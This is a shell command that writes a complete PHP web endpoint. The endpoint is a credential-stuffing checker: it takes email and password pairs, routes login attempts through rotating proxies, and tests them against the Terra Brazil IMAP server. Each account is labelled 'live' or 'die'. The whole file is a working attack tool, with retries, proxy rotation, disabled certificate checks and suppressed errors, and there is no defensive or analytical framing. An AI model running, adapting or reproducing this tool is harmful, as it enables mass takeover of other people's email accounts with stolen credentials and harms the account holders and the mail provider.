cat > /var/www/html/api.php << 'ENDOFFILE'
<?php
define('CRLF', chr(13) . chr(10));
define('LF', chr(10));
define('DQ', chr(34));

while (ob_get_level() > 0) { @ob_end_clean(); }
ob_start();

error_reporting(0);
ini_set('display_errors', '0');
ini_set('display_startup_errors', '0');
ini_set('log_errors', '0');
ini_set('max_execution_time', '120');

header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');

$action = isset($_GET['action']) ? $_GET['action'] : '';

if ($action === 'init') {
    $proxies = array();
    $proxyFile = __DIR__ . '/proxies.txt';
    if (file_exists($proxyFile)) {
        $content = @file_get_contents($proxyFile);
        $lines = array_filter(array_map('trim', explode(LF, $content)));
        foreach ($lines as $line) {
            if (empty($line) || $line[0] === '#') continue;
            $proxies[] = $line;
        }
    }
    ob_end_clean();
    echo json_encode(array('status' => 'ok', 'proxies' => array_values(array_unique($proxies))));
    exit;
}

if ($action === 'test_proxy') {
    $proxy = isset($_POST['proxy']) ? $_POST['proxy'] : '';
    if (empty($proxy)) {
        ob_end_clean();
        echo json_encode(array('status' => 'fail'));
        exit;
    }
    $ok = testProxy($proxy);
    ob_end_clean();
    echo json_encode(array('status' => $ok ? 'ok' : 'fail'));
    exit;
}

if ($action === 'check') {
    $email = isset($_POST['email']) ? $_POST['email'] : '';
    $password = isset($_POST['password']) ? $_POST['password'] : '';
    $proxy = isset($_POST['proxy']) ? $_POST['proxy'] : '';
    if (empty($email) || empty($password)) {
        ob_end_clean();
        echo json_encode(array('status' => 'die', 'email' => $email, 'reason' => 'Vazio'));
        exit;
    }
    try {
        $result = doValidate($email, $password, $proxy);
    } catch (\Throwable $e) {
        $result = array('status' => 'die', 'email' => $email, 'reason' => 'Erro');
    }
    ob_end_clean();
    echo json_encode($result);
    exit;
}

ob_end_clean();
echo json_encode(array('status' => 'ok'));
exit;

function parseProxy($proxy) {
    $host = ''; $port = 0; $user = ''; $pass = ''; $type = 'http';
    $lower = strtolower($proxy);
    if (strpos($lower, 'socks5') === 0) $type = 'socks5';
    elseif (strpos($lower, 'socks4') === 0) $type = 'socks4';
    if (preg_match('#^(socks[45]h?|https?)://([^:@]+):([^@]+)@([^:]+):(\d+)$#i', $proxy, $m)) {
        $user = $m[2]; $pass = $m[3]; $host = $m[4]; $port = (int)$m[5];
    } elseif (preg_match('#^([^:@]+):([^@]+)@([^:]+):(\d+)$#', $proxy, $m)) {
        $user = $m[1]; $pass = $m[2]; $host = $m[3]; $port = (int)$m[4];
    } elseif (preg_match('#^(socks[45]h?|https?)://([^:]+):(\d+)$#i', $proxy, $m)) {
        $host = $m[2]; $port = (int)$m[3];
    } elseif (preg_match('#^([^:]+):(\d+)$#', $proxy, $m)) {
        $host = $m[1]; $port = (int)$m[2];
    }
    return array('host' => $host, 'port' => $port, 'user' => $user, 'pass' => $pass, 'type' => $type);
}

function testProxy($proxy) {
    if (!extension_loaded('curl')) return false;
    $p = parseProxy($proxy);
    if (empty($p['host'])) return false;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.ipify.org/');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 15);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_PROXY, $p['host'] . ':' . $p['port']);
    if ($p['type'] === 'socks5') {
        curl_setopt($ch, CURLOPT_PROXYTYPE, 7);
    } else {
        curl_setopt($ch, CURLOPT_PROXYTYPE, 0);
        curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, true);
    }
    if (!empty($p['user'])) {
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $p['user'] . ':' . $p['pass']);
    }
    $result = curl_exec($ch);
    curl_close($ch);
    return ($result !== false && strlen(trim($result)) > 0);
}

function doValidate($email, $password, $proxy) {
    $timeout = 15;
    $delays = array(0, 1000000, 2000000, 4000000, 6000000);

    for ($attempt = 0; $attempt < 5; $attempt++) {
        if ($delays[$attempt] > 0) usleep($delays[$attempt]);

        if (!empty($proxy) && extension_loaded('curl')) {
            $r = tryCurlProxy($email, $password, $timeout, $proxy);
            if ($r !== null) return $r;
        }

        $r = trySocketDirect($email, $password, $timeout);
        if ($r !== null) return $r;

        if (extension_loaded('curl')) {
            $r = tryCurlDirect($email, $password, $timeout);
            if ($r !== null) return $r;
        }
    }

    return array('status' => 'die', 'email' => $email, 'reason' => 'Connection failed', 'retry_exhausted' => true);
}

function tryCurlProxy($email, $password, $timeout, $proxy) {
    $p = parseProxy($proxy);
    if (empty($p['host'])) return null;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'imaps://imap.terra.com.br:993/INBOX');
    curl_setopt($ch, CURLOPT_USERNAME, $email);
    curl_setopt($ch, CURLOPT_PASSWORD, $password);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
    curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
    curl_setopt($ch, CURLOPT_PROXY, $p['host'] . ':' . $p['port']);
    if ($p['type'] === 'socks5') {
        curl_setopt($ch, CURLOPT_PROXYTYPE, 7);
    } else {
        curl_setopt($ch, CURLOPT_PROXYTYPE, 0);
        curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, true);
    }
    if (!empty($p['user'])) {
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $p['user'] . ':' . $p['pass']);
    }
    $result = curl_exec($ch);
    $errno = curl_errno($ch);
    curl_close($ch);
    if ($errno === 67) return array('status' => 'die', 'email' => $email, 'reason' => 'Invalid credentials');
    if ($result !== false) return array('status' => 'live', 'email' => $email, 'reason' => 'OK');
    return null;
}

function trySocketDirect($email, $password, $timeout) {
    $socket = @fsockopen('ssl://imap.terra.com.br', 993, $errno, $errstr, $timeout);
    if ($socket === false) return null;
    stream_set_timeout($socket, $timeout);
    stream_set_blocking($socket, true);
    $greeting = '';
    $deadline = microtime(true) + $timeout;
    while (!feof($socket) && microtime(true) < $deadline) {
        $line = @fgets($socket, 8192);
        if ($line === false) { usleep(50000); continue; }
        $greeting .= $line;
        if (strpos($line, LF) !== false) break;
    }
    if (stripos($greeting, 'OK') === false) { fclose($socket); return null; }
    $safe_email = str_replace(array(chr(92), chr(34)), array(chr(92) . chr(92), chr(92) . chr(34)), $email);
    $safe_pass = str_replace(array(chr(92), chr(34)), array(chr(92) . chr(92), chr(92) . chr(34)), $password);
    $cmd = 'A1 LOGIN ' . DQ . $safe_email . DQ . ' ' . DQ . $safe_pass . DQ . CRLF;
    fwrite($socket, $cmd);
    $response = '';
    $deadline2 = microtime(true) + $timeout;
    while (!feof($socket)) {
        $line = @fgets($socket, 8192);
        if ($line === false) { usleep(50000); continue; }
        $response .= $line;
        if (strpos(trim($line), 'A1 ') === 0) break;
        if (microtime(true) > $deadline2) break;
    }
    @fwrite($socket, 'A2 LOGOUT' . CRLF);
    fclose($socket);
    if (preg_match('/A1\s+OK/i', $response)) return array('status' => 'live', 'email' => $email, 'reason' => 'OK');
    if (preg_match('/A1\s+NO/i', $response)) return array('status' => 'die', 'email' => $email, 'reason' => 'Invalid credentials');
    if (preg_match('/A1\s+BAD/i', $response)) return array('status' => 'die', 'email' => $email, 'reason' => 'Invalid credentials');
    return null;
}

function tryCurlDirect($email, $password, $timeout) {
    if (!extension_loaded('curl')) return null;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'imaps://imap.terra.com.br:993/INBOX');
    curl_setopt($ch, CURLOPT_USERNAME, $email);
    curl_setopt($ch, CURLOPT_PASSWORD, $password);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
    curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
    $result = curl_exec($ch);
    $errno = curl_errno($ch);
    curl_close($ch);
    if ($errno === 67) return array('status' => 'die', 'email' => $email, 'reason' => 'Invalid credentials');
    if ($result !== false) return array('status' => 'live', 'email' => $email, 'reason' => 'OK');
    return null;
}
ENDOFFILE
